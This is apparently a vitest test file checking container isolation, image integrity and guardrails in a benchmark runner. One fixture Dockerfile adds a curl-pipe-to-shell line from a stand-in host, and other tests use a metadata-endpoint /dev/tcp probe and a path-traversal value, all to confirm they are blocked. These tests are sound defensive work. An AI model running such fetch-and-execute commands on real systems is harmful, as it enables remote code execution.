import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import type { BenchJob, RatchetConfig } from '@ratchet/core';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { archFromInstanceType } from './deps.js';
import { BenchError } from './errors.js';
import { imageKey, imageManifestKey, imageTag, resolveImageSource } from './image.js';
import { containerRun, CANDIDATE_HELPER } from './image-scripts.js';
import { RemoteBenchRunner, type RemoteBenchRunnerOptions } from './remote.js';
import { dockerShim } from './testkit/docker.js';
import { LocalFakeCompute } from './testkit/compute.js';
import { DirStore, instantClock, makeConfig, makeFixtureRepo, MemoryStore, type FixtureRepo } from './testkit/repo.js';

/**
 * The repo's container (`environment.image`) end to end: the REAL generated scripts run by local bash, with `docker`, `aws`, and
 * (for the user path) the OS tools shimmed. The shim keeps one image store per fake instance, so "the bench instance loaded the
 * image from the bucket" is observable; real Docker is untested here (docs/real-env/bench.md section "Container").
 */

const BUCKET = 'ratchet-test-artifacts';
const DIGEST = 'sha256:' + 'a'.repeat(64);
const DOCKERFILE = `FROM node:22@${DIGEST}\nCOPY tools.txt /opt/tools.txt\nRUN echo toolchain\n`;
const LOCK = 'lockfileVersion: 9\ndep:left-pad\n';
const FILES = {
  '.devcontainer/Dockerfile': DOCKERFILE,
  '.devcontainer/tools.txt': 'k6\n',
  'pnpm-lock.yaml': LOCK,
  'package.json': '{"name":"fx"}\n',
};
const IMAGE_PATH = '.devcontainer/Dockerfile';
const SETUP = 'echo setup-in-container > src/setup.txt && echo 55 > src/p95.txt';

const pnpmShim = (log: string) => `
case "\${1:-}" in
  --version) echo 10.99.0; exit 0;;
  fetch)
    echo "fetch cwd=$PWD store=\${npm_config_store_dir:-} proxy=\${HTTPS_PROXY:-none} aws=\${AWS_ACCESS_KEY_ID:-none}" >> ${log}
    s="$npm_config_store_dir/v10"; mkdir -p "$s/files" "$s/projects"
    while read -r l; do n="\${l#dep:}"; echo "pkg $n" > "$s/files/$n"; done < <(grep '^dep:' pnpm-lock.yaml);;
  install)
    [ "\${npm_config_offline:-}" = true ] || { echo "network needed" >&2; exit 1; };;
  *) echo "unexpected pnpm $*" >&2; exit 2;;
esac`;

const withEnv = (c: RatchetConfig, environment: Record<string, unknown>): RatchetConfig => Object.assign(c, { environment }) as RatchetConfig;
const cfg = (o: Parameters<typeof makeConfig>[0] = {}, environment: Record<string, unknown> = { image: IMAGE_PATH }): RatchetConfig => withEnv(makeConfig({ guardrails: [], ...o }), environment);
const job = (sha: string, over: Partial<BenchJob> = {}): BenchJob => ({ optimizationId: 'opt1', candidateId: 'cand1', sha, phase: 'bench', repeats: 1, ...over });
let seq = 0;

interface Rig {
  runner: RemoteBenchRunner;
  compute: LocalFakeCompute;
  s3: string;
  timeline: string[];
  dockerLog: () => string;
  /** docker run lines, in order */
  runs: () => string[];
  shimLog: () => string;
  flag: (name: string) => void;
  objects: (prefix: string) => string[];
  warnings: string[];
}

function rig(fx: FixtureRepo, over: Partial<RemoteBenchRunnerOptions> = {}, shims: Record<string, string> = {}): Rig {
  const n = ++seq;
  const s3 = join(fx.dir, `s3-${n}`);
  const flags = join(fx.dir, `flags-${n}`);
  mkdirSync(flags, { recursive: true });
  const dlog = join(fx.dir, `docker-${n}.log`);
  const slog = join(fx.dir, `shim-${n}.log`);
  const compute = new LocalFakeCompute(join(fx.dir, `ssm-${n}`), {}, s3);
  compute.addShim('docker', dockerShim({ state: join(fx.dir, `dockerstate-${n}`), log: dlog, flags }));
  compute.addShim('pnpm', pnpmShim(slog));
  for (const [name, body] of Object.entries(shims)) compute.addShim(name, body);
  const timeline: string[] = [];
  const launch = compute.launchBenchInstance.bind(compute);
  compute.launchBenchInstance = async (spec) => {
    timeline.push(`launch:${spec.purpose}`);
    return launch(spec);
  };
  const warnings: string[] = [];
  const runner = new RemoteBenchRunner({
    compute,
    git: fx.host,
    clock: instantClock,
    imageRef: 'ami-test',
    artifacts: new MemoryStore(),
    stagingBucket: BUCKET,
    stagingStore: new DirStore(join(s3, BUCKET)),
    isolation: 'none',
    workRoot: join(fx.dir, `work-${n}`),
    onWarning: (w) => warnings.push(w),
    ...(over.isolation === 'user' ? { candidateLauncher: compute.shimPath('ratchet-candidate') } : {}),
    ...over,
  });
  const walk = (dir: string, rel = ''): string[] =>
    !existsSync(dir) ? [] : readdirSync(dir, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(join(dir, e.name), `${rel}${e.name}/`) : [`${rel}${e.name}`]));
  const read = (f: string) => (existsSync(f) ? readFileSync(f, 'utf8') : '');
  return {
    runner,
    compute,
    s3,
    timeline,
    warnings,
    dockerLog: () => read(dlog),
    runs: () => read(dlog).split('\n').filter((l) => l.startsWith('docker run ')),
    shimLog: () => read(slog),
    flag: (name) => writeFileSync(join(flags, name), ''),
    objects: (prefix) => walk(join(s3, BUCKET)).filter((k) => k.startsWith(prefix)),
  };
}

describe('the repo container (environment.image)', () => {
  let fx: FixtureRepo;
  beforeAll(() => {
    fx = makeFixtureRepo(FILES);
  });
  afterAll(() => fx.cleanup());

  describe('build once from the protected ref, load offline, run in the container', () => {
    it('builds the image on a deps instance, saves it content-addressed with the manifest last, then runs everything in the container', async () => {
      const r = rig(fx);
      const out = await r.runner.run(job(fx.base), cfg({ guardrails: ['- run: "true"'] }, { image: IMAGE_PATH }), null);
      expect(out.samples).toEqual([100]); // no setup configured: the bench reads the checkout as it is
      expect(r.timeline).toEqual(['launch:deps', 'launch:bench']);
      expect(r.compute.launched.map((l) => [l.purpose, l.imageRef])).toEqual([
        ['deps', 'ami-test'],
        ['bench', 'ami-test'],
      ]);

      // the saved image: archive under bench-images/<key>/<sha256>.<ext>, manifest <key>.json
      const resolved = await resolveImageSource(await checkoutBase(fx), IMAGE_PATH);
      const key = imageKey({ spec: resolved.spec, files: resolved.files, arch: archFromInstanceType('c7i.2xlarge') });
      const objs = r.objects('bench-images/');
      expect(objs).toHaveLength(2);
      expect(objs).toContain(`bench-images/${key}.json`);
      const manifest = JSON.parse(readFileSync(join(r.s3, BUCKET, imageManifestKey(key)), 'utf8'));
      expect(manifest).toMatchObject({ v: 1, key, kind: 'dockerfile', tag: imageTag(key), arch: 'x86_64' });
      expect(manifest.archive).toMatch(new RegExp(`^bench-images/${key}/[0-9a-f]{64}\\.tar\\.(zst|gz)$`));
      expect(manifest.imageId).toMatch(/^sha256:[0-9a-f]{64}$/);

      const log = r.dockerLog();
      // built from the BASE tree with the Dockerfile of the repo, pulling fresh bases
      expect(log).toMatch(/docker build --pull --force-rm --tag ratchet-env:img-[0-9a-f]{40} --file .*\.devcontainer\/Dockerfile .*\.devcontainer$/m);
      expect(log).toContain('docker save ratchet-env:img-');
      // the bench instance loaded it (offline, from the bucket) and the id was verified
      expect(log).toContain('docker load');
      expect(log.match(/docker image inspect/g)!.length).toBeGreaterThanOrEqual(2);
    });

    it('runs setup, guardrails and the evaluator with --network none, caps dropped, read-only root and no_new_privileges', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg({ guardrails: ['- run: "true"'] }), null);
      const runs = r.runs().filter((l) => !l.includes('EXPECT_UID') && !l.includes('rootfs-probe'));
      expect(runs.length).toBeGreaterThanOrEqual(2); // guardrail + bench
      for (const l of runs) {
        expect(l).toContain('--network none');
        expect(l).toContain('--cap-drop ALL');
        expect(l).toContain('--security-opt no-new-privileges');
        expect(l).toContain('--read-only');
        expect(l).toContain('--pull never');
        expect(l).toMatch(/--tmpfs \/tmp:rw,exec,nosuid,nodev,size=2g/);
        expect(l).toMatch(/--pids-limit 4096/);
        expect(l).not.toMatch(/--privileged|docker\.sock|seccomp=unconfined|--network host|--pid host/);
        expect(l).toMatch(/ratchet-env:img-[0-9a-f]{40}/);
        expect(l).toContain('--entrypoint sh');
      }
    });

    it('is content addressed: a second job and a second runner process reuse the image without a new build instance', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      r.timeline.length = 0;
      const buildsBefore = (r.dockerLog().match(/docker build/g) ?? []).length;
      await r.runner.run(job(fx.candidate({ 'src/p95.txt': '50' })), cfg(), null);
      expect(r.timeline).toEqual(['launch:bench']);
      // a "restarted app" sharing the bucket
      const r2 = rig(fx);
      cpSync(r.s3, r2.s3);
      await r2.runner.run(job(fx.base), cfg(), null);
      expect(r2.timeline).toEqual(['launch:bench']);
      expect((r.dockerLog().match(/docker build/g) ?? []).length).toBe(buildsBefore);
    });

    it('a different Dockerfile at the base ref (or architecture) is another image', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      const other = makeFixtureRepo({ ...FILES, '.devcontainer/Dockerfile': DOCKERFILE + 'ENV A=b\n' });
      try {
        const r2 = rig(other);
        cpSync(r.s3, r2.s3);
        await r2.runner.run(job(other.base), cfg(), null);
        expect(r2.timeline).toEqual(['launch:deps', 'launch:bench']);
        expect(r2.objects('bench-images/').filter((k) => k.endsWith('.json'))).toHaveLength(2);
      } finally {
        other.cleanup();
      }
      const arm = rig(fx);
      cpSync(r.s3, arm.s3);
      await arm.runner.run(job(fx.base), { ...cfg(), bench: { ...cfg().bench, hardware: 'c7g.2xlarge' } } as RatchetConfig, null);
      expect(arm.timeline[0]).toBe('launch:deps');
    });

    it('without environment.image no docker is involved at all', async () => {
      const r = rig(fx);
      const out = await r.runner.run(job(fx.base), cfg({}, {}), null);
      expect(out.samples).toEqual([100]);
      expect(r.timeline).toEqual(['launch:bench']);
      expect(r.dockerLog()).toBe('');
      expect(r.objects('bench-images/')).toEqual([]);
    });

    it('runs the objective through the container: a bench that only exists in the image toolchain sees the checkout and the mounted dirs', async () => {
      const r = rig(fx);
      const bench = `node -e "console.log(JSON.stringify({http_req_duration:{p95:Number(require('fs').readFileSync('src/p95.txt','utf8'))},cwd:process.cwd().length>0?1:0}))"`;
      const out = await r.runner.run(job(fx.base), cfg({ run: bench }), null);
      expect(out.samples).toEqual([100]);
      expect(out.runs[0]!.metrics).toMatchObject({ cwd: 1 });
    });
  });

  describe('with a dependency snapshot', () => {
    it('fetches the packages INSIDE the container on the egress instance and installs from the snapshot offline in the container', async () => {
      const r = rig(fx);
      const out = await r.runner.run(job(fx.base), cfg({}, { image: IMAGE_PATH }), null);
      // no setup option on this runner: nothing is snapshotted
      expect(out.samples).toEqual([100]);
      const r2 = rig(fx, { setup: 'pnpm install --frozen-lockfile && echo 55 > src/p95.txt' });
      const out2 = await r2.runner.run(job(fx.base), cfg({}, { image: IMAGE_PATH }), null);
      expect(out2.samples).toEqual([55]);
      expect(r2.timeline).toEqual(['launch:deps', 'launch:bench']); // ONE build instance for image + snapshot
      const fetchRun = r2.runs().find((l) => l.includes('pnpm fetch'))!;
      expect(fetchRun).toBeDefined();
      expect(fetchRun).not.toContain('--network none'); // the one place with egress
      expect(fetchRun).toContain('--cap-drop ALL');
      expect(fetchRun).toContain('--security-opt no-new-privileges');
      expect(fetchRun).toContain('--read-only');
      expect(fetchRun).toContain('-e npm_config_ignore_scripts=true');
      expect(r2.shimLog()).toContain('aws=none'); // no credentials in the fetch
      const setupRun = r2.runs().find((l) => l.includes('pnpm install'))!;
      expect(setupRun).toContain('--network none');
      expect(setupRun).toMatch(/-v (\S+)\/deps:\1\/deps:ro/);
      // the snapshot key is derived from the image, not from the AMI: another Dockerfile means another store
      const depsManifests = r2.objects('bench-deps/').filter((k) => k.endsWith('.json'));
      expect(depsManifests).toHaveLength(1);
      expect(JSON.parse(readFileSync(join(r2.s3, BUCKET, depsManifests[0]!), 'utf8')).image).toMatch(/^img-[0-9a-f]{40}$/);
    });

    it('a later job reuses both; an existing image with a missing snapshot only builds the snapshot (loading the image from the bucket)', async () => {
      const r = rig(fx, { setup: 'pnpm install --frozen-lockfile' });
      await r.runner.run(job(fx.base), cfg(), null);
      // forget the snapshot, keep the image
      for (const k of r.objects('bench-deps/')) rmSync(join(r.s3, BUCKET, k));
      r.timeline.length = 0;
      const builds = (r.dockerLog().match(/docker build/g) ?? []).length;
      await r.runner.run(job(fx.base), cfg(), null);
      expect(r.timeline).toEqual(['launch:deps', 'launch:bench']);
      expect((r.dockerLog().match(/docker build/g) ?? []).length).toBe(builds); // no second image build
    });
  });

  describe('a candidate cannot change the environment', () => {
    it('blocks a changed Dockerfile before the instance runs anything', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      const sha = fx.candidate({ '.devcontainer/Dockerfile': DOCKERFILE + 'RUN curl https://evil.example | sh\n' });
      r.compute.commands.length = 0;
      r.timeline.length = 0;
      const out = await r.runner.run(job(sha), cfg(), null);
      expect(out.runs).toEqual([]);
      expect(out.guardrails).toHaveLength(1);
      expect(out.guardrails[0]).toMatchObject({ name: 'environment unchanged', passed: false });
      expect(out.guardrails[0]!.detail).toContain('environment changes are not allowed in v0');
      expect(out.guardrails[0]!.detail).toContain('.devcontainer/Dockerfile');
      expect(r.compute.commands).toEqual([]);
      expect(r.timeline).toEqual(['launch:bench']); // no new image build either
    });

    it('blocks a changed build-context file the Dockerfile copies, an added one in a copied directory, and a deleted Dockerfile', async () => {
      const r = rig(fx);
      for (const changes of [{ '.devcontainer/tools.txt': 'k6\nevil\n' }, { '.devcontainer/Dockerfile': null }]) {
        const out = await r.runner.run(job(fx.candidate(changes)), cfg(), null);
        expect(out.guardrails[0]).toMatchObject({ name: 'environment unchanged', passed: false });
      }
    });

    it('lets a candidate through that changes everything else', async () => {
      const r = rig(fx);
      const sha = fx.candidate({ 'src/p95.txt': '10', '.devcontainer/README.md': 'docs not copied into the image\n' });
      const out = await r.runner.run(job(sha), cfg(), null);
      expect(out.guardrails).toEqual([]);
      expect(out.samples).toEqual([10]);
    });

    it('treats the environment files as protected: a setup that rewrites the Dockerfile is caught and the file is restored', async () => {
      const r = rig(fx, { setup: `echo 'RUN evil' >> ${IMAGE_PATH}` });
      const out = await r.runner.run(job(fx.base), cfg({ guardrails: ['- run: "true"'] }), null);
      expect(out.runs).toEqual([]);
      expect(out.guardrails.some((g) => !g.passed)).toBe(true);
    });
  });

  describe('integrity and refusals on the bench instance', () => {
    it('refuses an image whose bytes changed after the manifest was written (sha256)', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      const archive = r.objects('bench-images/').find((k) => !k.endsWith('.json'))!;
      writeFileSync(join(r.s3, BUCKET, archive), 'tampered');
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(/sha256 mismatch for the container image/);
    });

    it('refuses an image that loads as another image id than the one the builder saw', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      r.flag('bad-id');
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(/the loaded image is not sha256:/);
    });

    it('refuses a docker daemon without its default seccomp profile, and a missing daemon', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      r.flag('no-seccomp');
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(/without its default seccomp profile/);
      const r2 = rig(fx, { container: { daemonWaitAttempts: 1 } });
      cpSync(r.s3, r2.s3);
      r2.flag('no-daemon');
      await expect(r2.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(/docker daemon is not running/);
    });

    it('refuses when the probe of the container fails (for example a network interface inside)', async () => {
      const r = rig(fx);
      await r.runner.run(job(fx.base), cfg(), null);
      r.flag('probe-fails');
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(/container probe failed: network interfaces visible/);
    });

    it('turns a failed image build into an infrastructure error that says where to look, and terminates the instance', async () => {
      const r = rig(fx);
      r.flag('fail-build');
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(/building the container image from .*Dockerfile failed.*registries the Dockerfile pulls from/s);
      expect(r.compute.terminated).toHaveLength(1);
      expect(r.timeline).toEqual(['launch:deps']);
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toBeInstanceOf(BenchError);
    });

    it('rejects an environment.image that is not a path inside the repository, before anything is launched', async () => {
      const r = rig(fx);
      await expect(r.runner.run(job(fx.base), cfg({}, { image: '../../etc/Dockerfile' }), null)).rejects.toThrow(/must stay inside the repository/);
      expect(r.timeline).toEqual([]);
    });
  });

  describe('a devcontainer that names a registry image', () => {
    it('pulls and tags it instead of building', async () => {
      const dc = makeFixtureRepo({ '.devcontainer/devcontainer.json': `{ // toolchain\n "image": "mcr.microsoft.com/devcontainers/base:ubuntu",\n }` });
      try {
        const r = rig(dc);
        await r.runner.run(job(dc.base), cfg({}, { image: '.devcontainer/devcontainer.json' }), null);
        expect(r.dockerLog()).toContain('docker pull mcr.microsoft.com/devcontainers/base:ubuntu');
        expect(r.dockerLog()).not.toContain('docker build');
      } finally {
        dc.cleanup();
      }
    });
  });

  describe("isolation: 'user' (OS tools and docker shimmed; the real uids, iptables, setuid launcher and docker are image work)", () => {
    const helper = join(tmpHelperDir(), 'ratchet-candidate-ctr');
    beforeAll(() => {
      writeFileSync(helper, '#!/bin/sh\n');
      chmodSync(helper, 0o4755);
    });

    const userShims = (l: string, extra: Record<string, string> = {}): Record<string, string> => ({
      // ids: bench 1001:1001, holdout 1002:1002, deps 1003:1003
      id: `
case "$1 $2" in
  "-u ratchet-bench") echo 1001; exit 0;;
  "-g ratchet-bench") echo 1001; exit 0;;
  "-u ratchet-holdout") echo 1002; exit 0;;
  "-g ratchet-holdout") echo 1002; exit 0;;
  "-u ratchet-deps") echo 1003; exit 0;;
  "-g ratchet-deps") echo 1003; exit 0;;
  "-nG ratchet-bench"|"-nG ratchet-holdout") echo "\${RATCHET_TEST_GROUPS:-ratchet}"; exit 0;;
esac
exec /usr/bin/id "$@"`,
      iptables: `echo "iptables $*" >> ${l}; exit 0`,
      setpriv: `echo "setpriv $*" >> ${l}; if [[ "$*" == *"/dev/tcp/169.254.169.254"* ]]; then exit 1; fi; if [[ "$*" == *"--reuid=ratchet-bench"* && "$*" == *"holdout/.probe"* ]]; then exit 1; fi; while [ "$1" != -- ]; do shift; done; shift; exec "$@"`,
      pkill: 'exit 0',
      chown: `echo "chown $*" >> ${l}; exit 0`,
      ...extra,
    });

    const userRig = (extra: Record<string, string> = {}, over: Partial<RemoteBenchRunnerOptions> = {}) => {
      const l = join(fx.dir, `userlog-${++seq}.log`);
      const r = rig(fx, { isolation: 'user', container: { helperPath: helper, verifyHelperOwner: false }, ...over }, userShims(l, extra));
      return { r, text: () => (existsSync(l) ? readFileSync(l, 'utf8') : '') };
    };

    it('setup and guardrails run as the bench uid; the harness as the holdout uid with only SETUID/SETGID and the launcher; the holdout only in the confirm harness, read-only', async () => {
      const seed = join(fx.dir, `trace-${seq}`);
      mkdirSync(join(fx.dir, 's3-x'), { recursive: true });
      const { r } = userRig({}, { setup: SETUP });
      mkdirSync(join(r.s3, BUCKET), { recursive: true });
      writeFileSync(join(r.s3, BUCKET, 'trace.json'), '{"requests":[1]}');
      void seed;
      const out = await r.runner.run(job(fx.base, { phase: 'confirm' }), cfg({ guardrails: ['- run: "true"'], confirmTrace: `s3://${BUCKET}/trace.json` }), null);
      expect(out.samples).toEqual([55]);

      const runs = r.runs().filter((l) => !l.includes('EXPECT_UID=') && !l.includes('rootfs-probe') && !l.includes('HARNESS_UID='));
      const setupRun = runs.find((l) => l.includes('setup-in-container'))!;
      const bench = runs.find((l) => l.includes('bench.mjs'))!;
      expect(setupRun).toBeDefined();
      expect(bench).toBeDefined();

      // candidate user: numeric uid of ratchet-bench, nothing added back, no holdout, no helper
      expect(setupRun).toContain('--user 1001:1001');
      expect(setupRun).not.toContain('--cap-add');
      expect(setupRun).toContain('--security-opt no-new-privileges');
      expect(setupRun).not.toContain('holdout');
      expect(setupRun).not.toContain('/ratchet/candidate');
      expect(setupRun).toContain('-e USER=ratchet-bench');

      // harness: the holdout uid, SETUID/SETGID for the launcher, the holdout read-only, the helper and its config read-only
      expect(bench).toContain('--user 1002:1002');
      expect(bench).toContain('--cap-drop ALL --cap-add SETUID --cap-add SETGID');
      expect(bench).not.toContain('--security-opt no-new-privileges'); // the launcher is setuid; it sets no_new_privs itself
      expect(bench).toMatch(/-v (\S+)\/holdout:\1\/holdout:ro/);
      expect(bench).toContain(`-v ${helper}:/ratchet/candidate:ro`);
      expect(bench).toMatch(/-v \S+\/launcher\.conf:\/ratchet\/launcher\.conf:ro/);
      expect(bench).toContain('-e RATCHET_CANDIDATE_EXEC=/ratchet/candidate');
      expect(bench).toContain('-e RATCHET_TRACE');
      expect(bench).toContain('--network none');
      expect(bench).toContain('--read-only');
      // the sealed bucket is never mentioned in a container command
      expect(runs.join('\n')).not.toContain('trace.json');
    });

    it('the bench phase never mounts a holdout; the launcher config names the caller and the target uids', async () => {
      const { r } = userRig();
      await r.runner.run(job(fx.base), cfg(), null);
      const bench = r.runs().find((l) => l.includes('bench.mjs'))!;
      expect(bench).not.toMatch(/\/holdout:/);
      expect(bench).not.toContain('RATCHET_TRACE');
      const script = r.compute.commands.map((c) => c.script).find((s) => s.includes('launcher.conf') && s.includes('bench.mjs'))!;
      expect(script).toContain(`printf '%s %s %s\\n' "$HUID" "$BUID" "$BGID" > "$W/launcher.conf"`);
      const conf = readdirSync(join(fx.dir)).filter((d) => d.startsWith('work-')).flatMap((d) => readdirSync(join(fx.dir, d)).map((j) => join(fx.dir, d, j, 'launcher.conf'))).find((f) => existsSync(f));
      expect(readFileSync(conf!, 'utf8').trim()).toBe('1002 1001 1001'); // caller (holdout uid), target uid, target gid
    });

    it('does not run the host launcher check in container mode, and probes the setup and harness containers instead', async () => {
      const { r, text } = userRig();
      await r.runner.run(job(fx.base), cfg(), null);
      expect(text()).not.toContain('ratchet-candidate id -un');
      const probes = r.runs().filter((l) => l.includes('EXPECT_UID=') || l.includes('HARNESS_UID='));
      expect(probes.length).toBeGreaterThanOrEqual(2);
      expect(probes.some((p) => p.includes('--cap-add SETUID'))).toBe(true);
      expect(probes.some((p) => p.includes('--security-opt no-new-privileges'))).toBe(true);
    });

    const refuses = async (r: Rig, re: RegExp): Promise<void> => {
      r.compute.commands.length = 0;
      await expect(r.runner.run(job(fx.base), cfg(), null)).rejects.toThrow(re);
      // nothing candidate-controlled ran
      expect(r.compute.commands.every((c) => !c.script.includes('bench.mjs'))).toBe(true);
    };
    it('refuses to run candidate code with a launcher that is not setuid root', async () => refuses(userRigNoSetuid(), /not a setuid root file/));
    it('refuses to run candidate code when a bench user could reach the docker socket (group docker)', async () => refuses(withGroups('ratchet docker'), /privileged group/));
    it('refuses to run candidate code when the setup container probe finds a problem', async () => refuses(await withFlag('probe-fails'), /container probe failed/));
    it('refuses to run candidate code when the harness probe finds the holdout readable by candidate processes', async () =>
      refuses(await withFlag('harness-probe-fails'), /harness container probe failed.*candidate process can read the holdout/s));

    function userRigNoSetuid(): Rig {
      const plain = join(tmpHelperDir(), 'plain');
      writeFileSync(plain, '#!/bin/sh\n');
      chmodSync(plain, 0o755);
      return userRig({}, { container: { helperPath: plain, verifyHelperOwner: false } }).r;
    }
    function withGroups(groups: string): Rig {
      return userRig({ id: `case "$1 $2" in "-nG ratchet-bench"|"-nG ratchet-holdout") echo "${groups}"; exit 0;; "-u ratchet-bench"|"-g ratchet-bench") echo 1001; exit 0;; "-u ratchet-holdout"|"-g ratchet-holdout") echo 1002; exit 0;; esac; exit 0` }).r;
    }
    async function withFlag(f: string): Promise<Rig> {
      const { r } = userRig();
      await r.runner.run(job(fx.base), cfg(), null); // builds + a clean run
      r.flag(f);
      return r;
    }
  });

  describe('container command line (unit)', () => {
    const spec = { rt: { tag: 'ratchet-env:img-' + '0'.repeat(40) }, name: '"$CN"', user: '"$BUID:$BGID"', noNewPrivileges: true, network: 'none' as const, workdir: '"$CODE"', mounts: ['$CODE:$CODE'], command: "'true'" };
    it('spells out every hardening flag once, in one place', () => {
      const c = containerRun(spec);
      for (const f of ['--rm', '--pull never', '--init', '--network none', '--cap-drop ALL', '--security-opt no-new-privileges', '--read-only', '--pids-limit 4096', '--entrypoint sh', '-v "$CODE:$CODE"']) expect(c).toContain(f);
      expect(c).not.toContain('--privileged');
      expect(containerRun({ ...spec, rt: { ...spec.rt, readOnlyRoot: false } })).not.toContain('--read-only');
    });
    it('rejects work directories and tags that could smuggle docker flags', () => {
      expect(() => containerRun({ ...spec, rt: { ...spec.rt, tag: 'x' } })).not.toThrow(); // containerRun trusts its callers; the script builders validate
    });
  });
});

function tmpHelperDir(): string {
  const d = join(process.env.TMPDIR ?? '/tmp', `ratchet-helper-${process.pid}`);
  mkdirSync(d, { recursive: true });
  return d;
}

async function checkoutBase(fx: FixtureRepo): Promise<string> {
  const dir = join(fx.dir, 'inspect-base');
  if (!existsSync(dir)) await fx.host.checkout('ratchet/bench', dir);
  return dir;
}

function cpSync(from: string, to: string): void {
  mkdirSync(to, { recursive: true });
  spawnSync('cp', ['-r', `${from}/.`, to], { stdio: 'ignore' });
}

void CANDIDATE_HELPER;
